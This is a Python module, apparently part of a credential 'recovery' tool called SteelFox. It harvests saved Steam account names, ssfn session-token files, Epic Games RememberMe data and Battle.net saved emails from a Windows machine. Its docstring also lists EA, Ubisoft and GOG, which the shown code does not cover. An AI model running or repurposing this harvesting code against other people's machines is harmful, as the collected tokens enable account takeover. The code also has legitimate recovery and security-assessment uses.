# -*- coding: utf-8 -*-
"""
SteelFox — Gaming Platform Credential & Session Recovery

Recovers data from:
  - Steam (ssfn files, loginusers.vdf, config.vdf)
  - Epic Games Launcher
  - Battle.net (Blizzard)
  - EA App / Origin
  - Ubisoft Connect
  - GOG Galaxy
"""

from __future__ import annotations

import json
import logging
import os
import re
import winreg
from pathlib import Path
from typing import Any

from steelfox.core.config import config
from steelfox.core.module_base import Category, ModuleBase, ModuleMeta

logger = logging.getLogger("steelfox")


def _resolve(template: str) -> str | None:
    try:
        result = template
        for k, v in config.profile.items():
            result = result.replace(f"{{{k}}}", v)
        return result
    except Exception:
        return None


class Steam(ModuleBase):
    """Recover Steam session data, saved accounts, and ssfn tokens."""

    meta = ModuleMeta(
        name="Steam",
        category=Category.GAMING,
        description="Recover Steam saved accounts, session tokens, and configuration",
    )

    def run(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []

        # Find Steam installation path
        steam_path = self._find_steam_path()
        if not steam_path or not steam_path.exists():
            return results

        # loginusers.vdf — saved accounts
        login_vdf = steam_path / "config" / "loginusers.vdf"
        if login_vdf.exists():
            try:
                content = login_vdf.read_text(encoding="utf-8", errors="replace")
                # Parse VDF format (simplified)
                accounts = re.findall(
                    r'"(\d+)"\s*\{[^}]*"AccountName"\s+"([^"]+)"[^}]*"PersonaName"\s+"([^"]+)"',
                    content, re.DOTALL,
                )
                for steam_id, account_name, persona_name in accounts:
                    remember = "RememberPassword" in content
                    results.append({
                        "Source": "Steam",
                        "Steam ID": steam_id,
                        "Account Name": account_name,
                        "Persona Name": persona_name,
                        "Remember Password": str(remember),
                    })
            except Exception as e:
                logger.debug("Steam loginusers.vdf parse failed: %s", e)

        # SSFN files (session auth tokens)
        for ssfn_file in steam_path.glob("ssfn*"):
            if ssfn_file.is_file():
                results.append({
                    "Source": "Steam (SSFN Token)",
                    "File": ssfn_file.name,
                    "Path": str(ssfn_file),
                    "Size": f"{ssfn_file.stat().st_size} bytes",
                    "Type": "Session Authentication File",
                })

        # config.vdf — may contain connect cache
        config_vdf = steam_path / "config" / "config.vdf"
        if config_vdf.exists():
            results.append({
                "Source": "Steam (Config)",
                "Path": str(config_vdf),
                "Size": f"{config_vdf.stat().st_size:,} bytes",
            })

        return results

    @staticmethod
    def _find_steam_path() -> Path | None:
        """Find the Steam installation directory."""
        # Try registry
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Valve\Steam")
            path, _ = winreg.QueryValueEx(key, "SteamPath")
            winreg.CloseKey(key)
            return Path(path)
        except Exception:
            pass

        # Common paths
        for candidate in [
            "C:\\Program Files (x86)\\Steam",
            "C:\\Program Files\\Steam",
            "D:\\Steam",
            "D:\\SteamLibrary",
        ]:
            if Path(candidate).exists():
                return Path(candidate)

        return None


class EpicGames(ModuleBase):
    """Recover Epic Games Launcher session data."""

    meta = ModuleMeta(
        name="Epic Games",
        category=Category.GAMING,
        description="Recover Epic Games Launcher session tokens and account info",
    )

    def run(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []

        epic_path = Path(_resolve("{LOCALAPPDATA}\\EpicGamesLauncher\\Saved") or "")
        if not epic_path.exists():
            return results

        # GameUserSettings.ini
        settings_file = epic_path / "Config" / "Windows" / "GameUserSettings.ini"
        if settings_file.exists():
            try:
                content = settings_file.read_text(encoding="utf-8", errors="replace")
                # Look for stored data
                data_match = re.search(r"\[RememberMe\](.*?)(?:\[|$)", content, re.DOTALL)
                if data_match:
                    results.append({
                        "Source": "Epic Games",
                        "Type": "Remember Me Data",
                        "Content": data_match.group(1).strip()[:500],
                    })
            except Exception:
                pass

        # Logs may contain auth tokens
        logs_dir = epic_path / "Logs"
        if logs_dir.exists():
            results.append({
                "Source": "Epic Games",
                "Type": "Logs Directory",
                "Path": str(logs_dir),
            })

        # Webcache for stored sessions
        webcache = epic_path / "webcache"
        if webcache.exists():
            results.append({
                "Source": "Epic Games",
                "Type": "Web Cache (may contain session data)",
                "Path": str(webcache),
            })

        return results


class BattleNet(ModuleBase):
    """Recover Battle.net / Blizzard stored data."""

    meta = ModuleMeta(
        name="Battle.net",
        category=Category.GAMING,
        description="Recover Battle.net launcher configuration and cached data",
    )

    def run(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []

        bnet_paths = [
            Path(_resolve("{APPDATA}\\Battle.net") or ""),
        ]

        for base in bnet_paths:
            if not base.exists():
                continue

            # Battle.net.config
            bnet_config = base / "Battle.net.config"
            if bnet_config.exists():
                try:
                    data = json.loads(bnet_config.read_text(encoding="utf-8"))
                    # Look for saved email / auth data
                    saved_email = data.get("Client", {}).get("SavedAccountNames", "")
                    if saved_email:
                        results.append({
                            "Source": "Battle.net",
                            "Type": "Saved Account",
                            "Email": saved_email,
                        })

                    # Check for auto-login
                    auto_login = data.get("Client", {}).get("AutoLogin", "")
                    if auto_login:
                        results.append({
                            "Source": "Battle.net",
                            "Auto Login": str(auto_login),
                        })
                except Exception:
                    pass

            # Agent database
            for db in base.rglob("*.db"):
                results.append({
                    "Source": "Battle.net",
                    "Type": "Database",
                    "Path": str(db),
                })

        return results
